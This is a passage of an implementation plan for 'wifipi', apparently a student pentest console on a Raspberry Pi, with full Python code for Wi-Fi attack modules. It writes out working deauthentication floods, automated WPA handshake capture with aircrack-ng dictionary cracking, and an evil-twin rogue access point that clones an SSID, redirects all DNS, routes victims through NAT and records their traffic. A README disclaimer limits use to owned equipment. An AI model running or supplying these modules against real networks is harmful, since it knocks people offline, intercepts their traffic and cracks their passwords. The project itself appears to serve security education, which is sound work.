- [ ] **Commit checkpoint** — "add attack/deauth-targeted module".

---

## Task 18: `attack/deauth-broadcast` module (foreground)

**Files:**
- Create: `wifipi/modules/attack/deauth_broadcast.py`
- Modify: `tests/test_module_argvs.py`

- [ ] **Step 1: Add argv test**

Append to `tests/test_module_argvs.py`:
```python
from wifipi.modules.attack.deauth_broadcast import DeauthBroadcast


def test_deauth_broadcast_argv():
    m = DeauthBroadcast()
    argv = m.build_argv({
        "BSSID": "AA:BB:CC:11:22:33",
        "CHANNEL": "11",
        "COUNT": "20",
        "MON_IFACE": "wlan1mon",
    })
    assert argv == [
        "aireplay-ng", "--deauth", "20",
        "-a", "AA:BB:CC:11:22:33",
        "wlan1mon",
    ]
```

- [ ] **Step 2: Implement**

File: `wifipi/modules/attack/deauth_broadcast.py`
```python
"""attack/deauth-broadcast — kicks EVERY client of one AP."""

from __future__ import annotations

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import run as run_proc


class DeauthBroadcast(Module):
    NAME = "attack/deauth-broadcast"
    CATEGORY = "attack"
    DESCRIPTION = "Broadcast deauth: kicks ALL clients off the AP (use only on yours)."
    OPTIONS = {
        "BSSID":   OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CHANNEL": OptionSpec(required=True,  description="AP channel.", kind="int"),
        "COUNT":   OptionSpec(required=False, default="20",
                              description="Deauth frames to send.", kind="int"),
    }
    REQUIRES_TOOLS = ["aireplay-ng", "iw"]
    BLOCKING = True
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "attacks"

    def build_argv(self, opts: dict) -> list[str]:
        iface = opts["MON_IFACE"]
        return [
            "aireplay-ng", "--deauth", str(opts["COUNT"]),
            "-a", opts["BSSID"],
            iface,
        ]

    def run(self, ctx: RunContext) -> int:
        iface = ctx.options.get("MON_IFACE")
        if not iface:
            print("[x] MON_IFACE not set")
            return 2
        run_proc(["iw", "dev", iface, "set", "channel", str(ctx.options["CHANNEL"])])
        argv = self.build_argv(ctx.options)
        # Foreground: inherit stdout/stderr so the user sees output live.
        return run_proc(argv).returncode
```

- [ ] **Step 3: Run tests**

Run: `pytest tests/test_module_argvs.py -v`
Expected: 5 passed.

- [ ] **Commit checkpoint** — "add attack/deauth-broadcast module".

---

## Task 19: `attack/deauth-loop` module (background)

**Files:**
- Create: `wifipi/modules/attack/deauth_loop.py`
- Create: `wifipi/modules/attack/_deauth_loop_runner.py`

The deauth loop needs to run multiple `aireplay-ng` calls in sequence (burst → sleep → burst). We can't do that as a single argv, so the "background module" launches a tiny Python runner as the subprocess. The runner has its own argv that the module's `build_argv` emits.

- [ ] **Step 1: Write the runner script**

File: `wifipi/modules/attack/_deauth_loop_runner.py`
```python
"""Inner loop for attack/deauth-loop.

Invoked as a subprocess:
    python3 -m wifipi.modules.attack._deauth_loop_runner \
        --bssid AA:... --iface wlan1mon --interval 5 --burst 5 [--client DD:...]
"""

from __future__ import annotations

import argparse
import signal
import subprocess
import sys
import time


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--bssid", required=True)
    p.add_argument("--iface", required=True)
    p.add_argument("--client", default=None)
    p.add_argument("--interval", type=int, default=5)
    p.add_argument("--burst", type=int, default=5)
    args = p.parse_args()

    running = {"go": True}

    def stop(_sig, _frm):
        running["go"] = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    argv = ["aireplay-ng", "--deauth", str(args.burst), "-a", args.bssid]
    if args.client:
        argv += ["-c", args.client]
    argv.append(args.iface)

    round_ = 0
    while running["go"]:
        round_ += 1
        print(f"[*] round {round_}: {' '.join(argv)}", flush=True)
        subprocess.run(argv, check=False)
        for _ in range(args.interval):
            if not running["go"]:
                break
            time.sleep(1)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 2: Add argv test**

Append to `tests/test_module_argvs.py`:
```python
from wifipi.modules.attack.deauth_loop import DeauthLoop


def test_deauth_loop_argv_client():
    m = DeauthLoop()
    argv = m.build_argv({
        "BSSID": "AA:BB:CC:11:22:33",
        "CLIENT": "DD:EE:FF:44:55:66",
        "CHANNEL": "11",
        "INTERVAL": "5",
        "BURST": "5",
        "MON_IFACE": "wlan1mon",
    })
    assert argv[:3] == ["python3", "-m", "wifipi.modules.attack._deauth_loop_runner"]
    assert "--client" in argv
    assert "DD:EE:FF:44:55:66" in argv


def test_deauth_loop_argv_broadcast():
    m = DeauthLoop()
    argv = m.build_argv({
        "BSSID": "AA:BB:CC:11:22:33",
        "CHANNEL": "11",
        "INTERVAL": "5",
        "BURST": "5",
        "MON_IFACE": "wlan1mon",
    })
    assert "--client" not in argv
```

- [ ] **Step 3: Implement module**

File: `wifipi/modules/attack/deauth_loop.py`
```python
"""attack/deauth-loop — continuous deauth bursts every N seconds."""

from __future__ import annotations

from wifipi.module import Module
from wifipi.options import OptionSpec


class DeauthLoop(Module):
    NAME = "attack/deauth-loop"
    CATEGORY = "attack"
    DESCRIPTION = "Continuous deauth burst every N seconds. Kill with `kill <id>`."
    OPTIONS = {
        "BSSID":    OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CLIENT":   OptionSpec(required=False, default=None,
                               description="Victim MAC (omit for broadcast).", kind="mac"),
        "CHANNEL":  OptionSpec(required=True,  description="AP channel.", kind="int"),
        "INTERVAL": OptionSpec(required=False, default="5",
                               description="Seconds between bursts.", kind="int"),
        "BURST":    OptionSpec(required=False, default="5",
                               description="Frames per burst.", kind="int"),
    }
    REQUIRES_TOOLS = ["aireplay-ng"]
    BLOCKING = False
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "attacks"

    def build_argv(self, opts: dict) -> list[str]:
        iface = opts["MON_IFACE"]
        argv = [
            "python3", "-m", "wifipi.modules.attack._deauth_loop_runner",
            "--bssid", opts["BSSID"],
            "--iface", iface,
            "--interval", str(opts["INTERVAL"]),
            "--burst", str(opts["BURST"]),
        ]
        client = opts.get("CLIENT")
        if client:
            argv += ["--client", client]
        return argv
```

- [ ] **Step 4: Run tests**

Run: `pytest tests/test_module_argvs.py -v`
Expected: 7 passed.

- [ ] **Commit checkpoint** — "add attack/deauth-loop module with inner runner".

---

## Task 20: `attack/handshake` module (foreground orchestrator)

**Files:**
- Create: `wifipi/modules/attack/handshake.py`

- [ ] **Step 1: Implement**

File: `wifipi/modules/attack/handshake.py`
```python
"""attack/handshake — one-adapter handshake capture + optional offline crack.

Orchestrates:
  iw set channel -> airodump-ng (bg) -> wait for capture file ->
  loop(aireplay deauth burst -> poll aircrack-ng for handshake) until found
  -> optional aircrack-ng with wordlist.
"""

from __future__ import annotations

import subprocess
import time
from pathlib import Path

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import popen as procutil_popen, run as run_proc, terminate


class Handshake(Module):
    NAME = "attack/handshake"
    CATEGORY = "attack"
    DESCRIPTION = "Capture WPA handshake on MON_IFACE; optional offline crack."
    OPTIONS = {
        "BSSID":    OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CLIENT":   OptionSpec(required=True,  description="Victim MAC.", kind="mac"),
        "CHANNEL":  OptionSpec(required=True,  description="AP channel.", kind="int"),
        "TIMEOUT":  OptionSpec(required=False, default="60",
                               description="Give up after N seconds.", kind="int"),
        "WORDLIST": OptionSpec(required=False, default=None,
                               description="If set, auto-crack with this wordlist.", kind="path"),
    }
    REQUIRES_TOOLS = ["airodump-ng", "aireplay-ng", "aircrack-ng", "iw"]
    BLOCKING = True
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "handshakes"

    def run(self, ctx: RunContext) -> int:
        iface = ctx.options.get("MON_IFACE")
        if not iface:
            print("[x] MON_IFACE not set")
            return 2
        bssid = ctx.options["BSSID"]
        client = ctx.options["CLIENT"]
        channel = str(ctx.options["CHANNEL"])
        timeout = int(ctx.options.get("TIMEOUT", 60))
        wordlist = ctx.options.get("WORDLIST")

        prefix = ctx.loot_dir / "handshake"
        capfile = Path(str(prefix) + "-01.cap")

        run_proc(["iw", "dev", iface, "set", "channel", channel])

        airodump = procutil_popen(
            ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", str(prefix), iface],
            log_path=ctx.loot_dir / "airodump.log",
        )

        try:
            print(f"[*] waiting for {capfile.name}...")
            for _ in range(15):
                if capfile.exists():
                    break
                time.sleep(1)
            if not capfile.exists():
                print("[x] airodump didn't create capture (channel/BSSID wrong?)")
                return 3

            deadline = time.time() + timeout
            round_ = 0
            while time.time() < deadline:
                round_ += 1
                print(f"[*] round {round_} — deauth burst (5 frames)")
                run_proc(
                    ["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                    check=False,
                )
                for _ in range(5):
                    time.sleep(1)
                    if self._has_handshake(capfile, bssid):
                        print(f"[+] handshake captured in {capfile} (after {round_} rounds)")
                        if wordlist:
                            return self._crack(wordlist, bssid, capfile, ctx)
                        return 0
            print(f"[x] no handshake after {timeout}s")
            return 4
        finally:
            terminate(airodump)

    def _has_handshake(self, capfile: Path, bssid: str) -> bool:
        res = run_proc(
            ["aircrack-ng", "-b", bssid, str(capfile)],
            capture_output=True, text=True, stdin=subprocess.DEVNULL, check=False,
        )
        return "1 handshake" in res.stdout

    def _crack(self, wordlist: str, bssid: str, capfile: Path, ctx: RunContext) -> int:
        wl = Path(wordlist)
        if not wl.is_file():
            print(f"[x] wordlist not readable: {wordlist}")
            return 5
        print(f"[*] offline crack with {wl}")
        with (ctx.loot_dir / "aircrack.log").open("ab") as fh:
            return run_proc(
                ["aircrack-ng", "-w", str(wl), "-b", bssid, str(capfile)],
                stdout=fh, stderr=fh,
            ).returncode
```

- [ ] **Step 2: Discovery smoke test**

Run: `pytest tests/test_module_discovery.py -v`
Expected: PASS.

- [ ] **Commit checkpoint** — "add attack/handshake orchestrator module".

---

## Task 21: `attack/handshake-dual` module (foreground, dual-adapter)

**Files:**
- Create: `wifipi/modules/attack/handshake_dual.py`

- [ ] **Step 1: Implement**

File: `wifipi/modules/attack/handshake_dual.py`
```python
"""attack/handshake-dual — handshake capture using two monitor adapters."""

from __future__ import annotations

import subprocess
import time
from pathlib import Path

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import popen as procutil_popen, run as run_proc, terminate


class HandshakeDual(Module):
    NAME = "attack/handshake-dual"
    CATEGORY = "attack"
    DESCRIPTION = "Handshake capture using separate MON_IFACE (airodump) and ATTACK_IFACE (deauth)."
    OPTIONS = {
        "BSSID":    OptionSpec(required=True,  description="Target AP BSSID.", kind="bssid"),
        "CLIENT":   OptionSpec(required=True,  description="Victim MAC.", kind="mac"),
        "CHANNEL":  OptionSpec(required=True,  description="AP channel.", kind="int"),
        "TIMEOUT":  OptionSpec(required=False, default="120",
                               description="Give up after N seconds.", kind="int"),
        "WORDLIST": OptionSpec(required=False, default=None,
                               description="If set, auto-crack with this wordlist.", kind="path"),
    }
    REQUIRES_TOOLS = ["airodump-ng", "aireplay-ng", "aircrack-ng", "iw"]
    BLOCKING = True
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "handshakes"

    def run(self, ctx: RunContext) -> int:
        cap_iface = ctx.options.get("MON_IFACE")
        atk_iface = ctx.options.get("ATTACK_IFACE")
        if not cap_iface or not atk_iface:
            print("[x] MON_IFACE and ATTACK_IFACE must both be set")
            return 2
        if cap_iface == atk_iface:
            print("[x] MON_IFACE and ATTACK_IFACE must be different adapters")
            return 2

        bssid = ctx.options["BSSID"]
        client = ctx.options["CLIENT"]
        channel = str(ctx.options["CHANNEL"])
        timeout = int(ctx.options.get("TIMEOUT", 120))
        wordlist = ctx.options.get("WORDLIST")

        prefix = ctx.loot_dir / "handshake"
        capfile = Path(str(prefix) + "-01.cap")

        run_proc(["iw", "dev", cap_iface, "set", "channel", channel])
        run_proc(["iw", "dev", atk_iface, "set", "channel", channel])

        airodump = procutil_popen(
            ["airodump-ng", "-c", channel, "--bssid", bssid, "-w", str(prefix), cap_iface],
            log_path=ctx.loot_dir / "airodump.log",
        )

        try:
            for _ in range(15):
                if capfile.exists():
                    break
                time.sleep(1)
            if not capfile.exists():
                print("[x] airodump didn't create capture")
                return 3

            deadline = time.time() + timeout
            round_ = 0
            while time.time() < deadline:
                round_ += 1
                print(f"[*] round {round_} — deauth on {atk_iface}")
                run_proc(
                    ["aireplay-ng", "--deauth", "5", "-a", bssid, "-c", client, atk_iface],
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False,
                )
                for _ in range(5):
                    time.sleep(1)
                    if self._has_handshake(capfile, bssid):
                        print(f"[+] handshake captured in {capfile}")
                        if wordlist:
                            return self._crack(wordlist, bssid, capfile, ctx)
                        return 0
            print(f"[x] no handshake after {timeout}s")
            return 4
        finally:
            terminate(airodump)

    def _has_handshake(self, capfile: Path, bssid: str) -> bool:
        res = run_proc(
            ["aircrack-ng", "-b", bssid, str(capfile)],
            capture_output=True, text=True, stdin=subprocess.DEVNULL, check=False,
        )
        return "1 handshake" in res.stdout

    def _crack(self, wordlist: str, bssid: str, capfile: Path, ctx: RunContext) -> int:
        wl = Path(wordlist)
        if not wl.is_file():
            print(f"[x] wordlist not readable: {wordlist}")
            return 5
        with (ctx.loot_dir / "aircrack.log").open("ab") as fh:
            return run_proc(
                ["aircrack-ng", "-w", str(wl), "-b", bssid, str(capfile)],
                stdout=fh, stderr=fh,
            ).returncode
```

- [ ] **Step 2: Discovery smoke test**

Run: `pytest tests/test_module_discovery.py -v`
Expected: PASS.

- [ ] **Commit checkpoint** — "add attack/handshake-dual module".

---

## Task 22: `attack/evil-twin` module (background orchestrator)

**Files:**
- Create: `wifipi/modules/attack/evil_twin.py`
- Create: `wifipi/modules/attack/_evil_twin_runner.py`

Same pattern as `deauth-loop`: the "background module" is a Python runner that manages hostapd, dnsmasq, tcpdump, iptables, and a deauth loop. The module's `build_argv` just points at the runner.

- [ ] **Step 1: Write the runner**

File: `wifipi/modules/attack/_evil_twin_runner.py`
```python
"""Evil-twin runner invoked as a subprocess by attack/evil-twin.

Brings up hostapd + dnsmasq on AP_IFACE, configures NAT through the
upstream interface if present, starts tcpdump on AP_IFACE, and runs a
continuous deauth loop on MON_IFACE. Tears everything down on SIGTERM.
"""

from __future__ import annotations

import argparse
import signal
import subprocess
import sys
import time
from pathlib import Path


def hostapd_conf(ap_iface: str, ssid: str, channel: int, wpa_pass: str | None) -> str:
    lines = [
        f"interface={ap_iface}",
        "driver=nl80211",
        f"ssid={ssid}",
        "hw_mode=g",
        f"channel={channel}",
        "ieee80211n=1",
        "auth_algs=1",
        "wmm_enabled=1",
    ]
    if wpa_pass:
        lines += [
            "wpa=2",
            "wpa_key_mgmt=WPA-PSK",
            "wpa_pairwise=CCMP",
            "rsn_pairwise=CCMP",
            f"wpa_passphrase={wpa_pass}",
        ]
    return "\n".join(lines) + "\n"


def dnsmasq_conf(ap_iface: str, log_path: Path) -> str:
    return (
        f"interface={ap_iface}\n"
        "bind-interfaces\n"
        "dhcp-range=10.0.0.10,10.0.0.100,12h\n"
        "dhcp-option=3,10.0.0.1\n"
        "dhcp-option=6,10.0.0.1\n"
        "address=/#/10.0.0.1\n"
        "log-queries\n"
        f"log-facility={log_path}\n"
    )


def main() -> int:
    p = argparse.ArgumentParser()
    p.add_argument("--workdir", required=True)
    p.add_argument("--ap-iface", required=True)
    p.add_argument("--mon-iface", required=True)
    p.add_argument("--upstream", default="eth0")
    p.add_argument("--bssid", required=True)
    p.add_argument("--ssid", required=True)
    p.add_argument("--channel", type=int, required=True)
    p.add_argument("--client", default=None)
    p.add_argument("--wpa-pass", default=None)
    args = p.parse_args()

    workdir = Path(args.workdir)
    workdir.mkdir(parents=True, exist_ok=True)
    hostapd_path = workdir / "hostapd.conf"
    dnsmasq_path = workdir / "dnsmasq.conf"
    dnsmasq_log = workdir / "dnsmasq.log"
    hostapd_log = workdir / "hostapd.log"
    pcap = workdir / "rogue.pcap"

    hostapd_path.write_text(hostapd_conf(args.ap_iface, args.ssid, args.channel, args.wpa_pass))
    dnsmasq_path.write_text(dnsmasq_conf(args.ap_iface, dnsmasq_log))

    subprocess.run(["nmcli", "device", "set", args.ap_iface, "managed", "no"], check=False)
    subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "addr", "add", "10.0.0.1/24", "dev", args.ap_iface], check=False)
    subprocess.run(["ip", "link", "set", args.ap_iface, "up"], check=False)

    nat_ok = Path(f"/sys/class/net/{args.upstream}").exists()
    if nat_ok:
        subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=1"],
                       stdout=subprocess.DEVNULL, check=False)
        subprocess.run(["iptables", "-t", "nat", "-A", "POSTROUTING",
                        "-o", args.upstream, "-j", "MASQUERADE"], check=False)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", args.ap_iface,
                        "-o", args.upstream, "-j", "ACCEPT"], check=False)
        subprocess.run(["iptables", "-A", "FORWARD", "-i", args.upstream, "-o", args.ap_iface,
                        "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                       check=False)

    subprocess.run(["iw", "dev", args.mon_iface, "set", "channel", str(args.channel)], check=False)

    hostapd_fh = open(hostapd_log, "ab")
    dnsmasq_fh = open(dnsmasq_log, "ab")
    hostapd = subprocess.Popen(["hostapd", str(hostapd_path)],
                               stdout=hostapd_fh, stderr=hostapd_fh)
    dnsmasq = subprocess.Popen(["dnsmasq", "--no-daemon", "-C", str(dnsmasq_path)],
                               stdout=dnsmasq_fh, stderr=dnsmasq_fh)
    tcpdump = subprocess.Popen(
        ["tcpdump", "-i", args.ap_iface, "-n", "-s0", "-w", str(pcap)],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
    )

    running = {"go": True}

    def stop(_sig, _frm):
        running["go"] = False

    signal.signal(signal.SIGTERM, stop)
    signal.signal(signal.SIGINT, stop)

    print(f"[*] rogue AP up: SSID={args.ssid!r} ch={args.channel} on {args.ap_iface}", flush=True)

    deauth_argv = ["aireplay-ng", "--deauth", "5", "-a", args.bssid]
    if args.client:
        deauth_argv += ["-c", args.client]
    deauth_argv.append(args.mon_iface)

    try:
        round_ = 0
        while running["go"]:
            round_ += 1
            print(f"[*] round {round_}: deauthing {args.client or '(broadcast)'}", flush=True)
            subprocess.run(deauth_argv, check=False)
            for _ in range(5):
                if not running["go"]:
                    break
                time.sleep(1)
            if hostapd.poll() is not None:
                print("[x] hostapd died", flush=True)
                break
    finally:
        for proc in (hostapd, dnsmasq, tcpdump):
            try:
                proc.terminate()
            except Exception:
                pass
        for proc in (hostapd, dnsmasq, tcpdump):
            try:
                proc.wait(timeout=3)
            except Exception:
                try:
                    proc.kill()
                except Exception:
                    pass
        hostapd_fh.close()
        dnsmasq_fh.close()
        if nat_ok:
            subprocess.run(["iptables", "-t", "nat", "-D", "POSTROUTING",
                            "-o", args.upstream, "-j", "MASQUERADE"], check=False)
            subprocess.run(["iptables", "-D", "FORWARD", "-i", args.ap_iface,
                            "-o", args.upstream, "-j", "ACCEPT"], check=False)
            subprocess.run(["iptables", "-D", "FORWARD", "-i", args.upstream, "-o", args.ap_iface,
                            "-m", "state", "--state", "RELATED,ESTABLISHED", "-j", "ACCEPT"],
                           check=False)
            subprocess.run(["sysctl", "-w", "net.ipv4.ip_forward=0"],
                           stdout=subprocess.DEVNULL, check=False)
        subprocess.run(["ip", "addr", "flush", "dev", args.ap_iface], check=False)
    return 0


if __name__ == "__main__":
    sys.exit(main())
```

- [ ] **Step 2: Add argv test**

Append to `tests/test_module_argvs.py`:
```python
from wifipi.modules.attack.evil_twin import EvilTwin


def test_evil_twin_argv():
    m = EvilTwin()
    argv = m.build_argv({
        "BSSID": "AA:BB:CC:11:22:33",
        "SSID": "MyTestNetwork",
        "CHANNEL": "11",
        "CLIENT": "DD:EE:FF:44:55:66",
        "WPA_PASSPHRASE": "password123",
        "UPSTREAM_IFACE": "eth0",
        "MON_IFACE": "wlan1mon",
        "AP_IFACE": "wlan2",
        "_WORKDIR": "/tmp/loot/run",
    })
    assert argv[:3] == ["python3", "-m", "wifipi.modules.attack._evil_twin_runner"]
    assert "--ssid" in argv and "MyTestNetwork" in argv
    assert "--client" in argv
    assert "--wpa-pass" in argv
```

- [ ] **Step 3: Implement module**

File: `wifipi/modules/attack/evil_twin.py`
```python
"""attack/evil-twin — rogue AP cloning one SSID + continuous deauth."""

from __future__ import annotations

from wifipi.module import Module
from wifipi.options import OptionSpec


class EvilTwin(Module):
    NAME = "attack/evil-twin"
    CATEGORY = "attack"
    DESCRIPTION = "Rogue AP (hostapd+dnsmasq) that clones SSID + continuous deauth on MON_IFACE."
    OPTIONS = {
        "BSSID":          OptionSpec(required=True,  description="Real AP BSSID to kick victim off.", kind="bssid"),
        "SSID":           OptionSpec(required=True,  description="SSID to clone."),
        "CHANNEL":        OptionSpec(required=True,  description="AP channel.", kind="int"),
        "CLIENT":         OptionSpec(required=False, default=None,
                                     description="Victim MAC (omit to broadcast deauth).", kind="mac"),
        "WPA_PASSPHRASE": OptionSpec(required=False, default=None,
                                     description="Mirror the real AP's password (omit for open rogue)."),
        "UPSTREAM_IFACE": OptionSpec(required=False, default="eth0",
                                     description="Interface NAT is routed through."),
    }
    REQUIRES_TOOLS = ["hostapd", "dnsmasq", "aireplay-ng", "iptables", "tcpdump", "iw"]
    BLOCKING = False
    REQUIRES_CONFIRMATION = True
    LOOT_SUBDIR = "evil-twin"

    def build_argv(self, opts: dict) -> list[str]:
        mon = opts.get("MON_IFACE")
        ap = opts.get("AP_IFACE")
        if not mon:
            raise RuntimeError("MON_IFACE not set")
        if not ap:
            raise RuntimeError("AP_IFACE not set — plug in a second USB adapter")
        if mon == ap:
            raise RuntimeError("MON_IFACE and AP_IFACE must be different adapters")
        argv = [
            "python3", "-m", "wifipi.modules.attack._evil_twin_runner",
            "--workdir", opts.get("_WORKDIR", "/tmp/eviltwin"),
            "--ap-iface", ap,
            "--mon-iface", mon,
            "--upstream", opts.get("UPSTREAM_IFACE", "eth0"),
            "--bssid", opts["BSSID"],
            "--ssid", opts["SSID"],
            "--channel", str(opts["CHANNEL"]),
        ]
        if opts.get("CLIENT"):
            argv += ["--client", opts["CLIENT"]]
        if opts.get("WPA_PASSPHRASE"):
            argv += ["--wpa-pass", opts["WPA_PASSPHRASE"]]
        return argv
```

- [ ] **Step 4: Inject `_WORKDIR` at run-time in console**

The evil-twin runner needs to know where to put hostapd.conf / logs / pcap — the loot run directory. In `wifipi/console.py`, `do_run`, extend the background branch so `_WORKDIR` is set before `build_argv`:

Find:
```python
            # Default OUTPUT_PREFIX to something under the loot dir so captures
            # land alongside the run log.
            if "OUTPUT_PREFIX" in mod.OPTIONS and opts.get("OUTPUT_PREFIX") is None:
                opts["OUTPUT_PREFIX"] = str(loot_dir / "capture")
            argv = mod.build_argv(opts)
            job = self.jobs.start(name=mod.NAME, argv=argv, log_path=log_path)
```

Change to:
```python
            # Default OUTPUT_PREFIX to something under the loot dir so captures
            # land alongside the run log.
            if "OUTPUT_PREFIX" in mod.OPTIONS and opts.get("OUTPUT_PREFIX") is None:
                opts["OUTPUT_PREFIX"] = str(loot_dir / "capture")
            opts["_WORKDIR"] = str(loot_dir)
            argv = mod.build_argv(opts)
            job = self.jobs.start(name=mod.NAME, argv=argv, log_path=log_path)
```

- [ ] **Step 5: Run tests**

Run: `pytest tests/test_module_argvs.py tests/test_module_discovery.py -v`
Expected: 8 argv tests pass + discovery passes.

- [ ] **Commit checkpoint** — "add attack/evil-twin module + runner".

---

## Task 23: `post/crack` module

**Files:**
- Create: `wifipi/modules/post/crack.py`
- Modify: `tests/test_module_argvs.py`

- [ ] **Step 1: Add argv test**

Append to `tests/test_module_argvs.py`:
```python
from wifipi.modules.post.crack import Crack


def test_crack_argv():
    m = Crack()
    argv = m.build_argv({
        "BSSID": "AA:BB:CC:11:22:33",
        "WORDLIST": "/usr/share/wordlists/rockyou.txt",
        "CAPTURE_FILE": "/tmp/handshake-01.cap",
    })
    assert argv == [
        "aircrack-ng",
        "-w", "/usr/share/wordlists/rockyou.txt",
        "-b", "AA:BB:CC:11:22:33",
        "/tmp/handshake-01.cap",
    ]
```

- [ ] **Step 2: Implement**

File: `wifipi/modules/post/crack.py`
```python
"""post/crack — offline aircrack-ng against a captured pcap."""

from __future__ import annotations

from pathlib import Path

from wifipi.module import Module, RunContext
from wifipi.options import OptionSpec
from wifipi.procutil import run as run_proc


class Crack(Module):
    NAME = "post/crack"
    CATEGORY = "post"
    DESCRIPTION = "Offline dictionary attack against a WPA handshake pcap."
    OPTIONS = {
        "BSSID":        OptionSpec(required=True,  description="BSSID whose handshake we're cracking.", kind="bssid"),
        "WORDLIST":     OptionSpec(required=True,  description="Path to wordlist.", kind="path"),
        "CAPTURE_FILE": OptionSpec(required=True,  description="Path to .cap with the handshake.", kind="path"),
    }
    REQUIRES_TOOLS = ["aircrack-ng"]
    BLOCKING = True
    LOOT_SUBDIR = "crack"

    def build_argv(self, opts: dict) -> list[str]:
        return [
            "aircrack-ng",
            "-w", opts["WORDLIST"],
            "-b", opts["BSSID"],
            opts["CAPTURE_FILE"],
        ]

    def run(self, ctx: RunContext) -> int:
        wl = Path(ctx.options["WORDLIST"])
        cap = Path(ctx.options["CAPTURE_FILE"])
        if not wl.is_file():
            print(f"[x] wordlist not readable: {wl}  (rockyou is often gzipped — gunzip it)")
            return 2
        if not cap.is_file():
            print(f"[x] capture not readable: {cap}")
            return 2
        argv = self.build_argv(ctx.options)
        # Foreground: let aircrack-ng print progress + "KEY FOUND!" to the user.
        return run_proc(argv).returncode
```

- [ ] **Step 3: Run tests**

Run: `pytest tests/test_module_argvs.py tests/test_module_discovery.py -v`
Expected: 9 argv tests pass + discovery passes.

- [ ] **Commit checkpoint** — "add post/crack module".

---

## Task 24: README rewrite + final smoke test

**Files:**
- Modify: `README.md`

- [ ] **Step 1: Replace the README with a console-first rewrite**

File: `README.md`
```markdown
# wifipi — WiFi Pineapple Equivalent on a Raspberry Pi

School project for SNE / Applied Security. A `msfconsole`-style
interactive console for running the standard Pi-based Wi-Fi pentest
workflow (deauth, handshake capture, evil twin, offline crack) against
equipment the operator owns.

---

## Disclaimer — educational use only

This repository is published strictly for educational and authorised
defensive-research use. Every module performs an operation that, when
used outside a controlled lab and against equipment the operator does
not own, is illegal in most jurisdictions including the Netherlands and
the EU.

By using this code you agree that:

1. You will only target wireless equipment that you own or have
   explicit, written authorisation to test.
2. You accept full legal and ethical responsibility for what you do.
3. You will physically isolate your lab so that stray frames do not
   reach networks or devices outside your scope.

Relevant Dutch / EU statute (non-exhaustive):

- Wetboek van Strafrecht Art. 138ab — computer trespass
- Wetboek van Strafrecht Art. 139c / 139d — interception of communications
- Telecommunicatiewet — wilful radio interference

`lab-notes/inventory.md` is where you record every BSSID and MAC in
scope. Fill it in before running anything.

---

## Required deliverable

The graded deliverable is the deauth attack only. Everything else
(handshake capture + offline crack, evil twin, PMF mitigation demo) is
optional bonus material.

`TODO.md` walks through the required path; `REPORT.md` has placeholders
for the bonus sections you can delete if you skip them.

---

## Install

```bash
git clone <this repo>
cd Wifi-location-detection
pip install -r requirements.txt
sudo ./wifipi.sh
```

Kali Linux ARM on a Pi 4 is the expected target. Non-Kali distros need
`kali-tools-wireless`, `hostapd`, `dnsmasq`, `iptables`, `tcpdump`
installed manually.

## Launch

```bash
sudo ./wifipi.sh
```

Press Enter past the legal banner. You'll land at `wifipi >`.

## First-time setup: set up your two adapters

```
wifipi > iface auto
[*] wlan1 -> MON_IFACE (monitor mode: wlan1mon)
[*] wlan2 -> AP_IFACE
```

`iface auto` puts one adapter into monitor mode and assigns the other as
the rogue-AP adapter. Check with `ifaces`.

If you have only one adapter, `iface auto` assigns it to both `MON_IFACE`
and `ATTACK_IFACE`; evil-twin will refuse to run.

## Running the required deliverable (deauth demo)

```
wifipi > use attack/deauth-targeted
wifipi (deauth-targeted) > setg BSSID  AA:BB:CC:11:22:33
wifipi (deauth-targeted) > setg CLIENT DD:EE:FF:44:55:66
wifipi (deauth-targeted) > setg CHANNEL 11
wifipi (deauth-targeted) > show options
wifipi (deauth-targeted) > run
```

A red-banner legal acknowledgement is printed once at startup. A yellow
per-attack confirmation is printed before each deauth (3-second pause,
then fires).

## Running a background scan

```
wifipi > use recon/scan
wifipi (recon/scan) > run
[+] Job 0 started: recon/scan -> loot/scans/2026-04-17_.../
wifipi [1j] > jobs
 ID   MODULE               STATE    ELAPSED  PID
 0    recon/scan           running  42s      12345
wifipi [1j] > kill 0
```

The `[1j]` segment in the prompt is always-visible: if you ever have
jobs running, you see a count right where you type.

## Modules

Run `show modules` for the current list. Organised by phase:

- `recon/scan` — channel-hopping airodump
- `recon/target` — airodump locked to one AP
- `attack/deauth-targeted` — required deliverable
- `attack/deauth-broadcast` — kick every client of an AP
- `attack/deauth-loop` — continuous deauth (the "pull" half of evil twin)
- `attack/handshake` — capture + optional offline crack, one adapter
- `attack/handshake-dual` — capture + optional offline crack, two adapters
- `attack/evil-twin` — rogue AP cloning an SSID + continuous deauth
- `post/crack` — offline aircrack-ng on an existing pcap
- `util/prereq-check` — verify tools are installed
- `util/cleanup` — revert monitor mode, flush iptables, restart NM

## Common workflows

**Deauth demo (required deliverable):**
```
iface auto
use attack/deauth-targeted
setg BSSID <AP> ; setg CLIENT <phone> ; setg CHANNEL <ch>
run
```

**Handshake capture + crack (two adapters, optimal):**
```
iface auto
use attack/handshake-dual
setg BSSID <AP> ; setg CLIENT <phone> ; setg CHANNEL <ch>
set WORDLIST /usr/share/wordlists/rockyou.txt
run
```

**Evil twin:**
```
iface auto
use attack/evil-twin
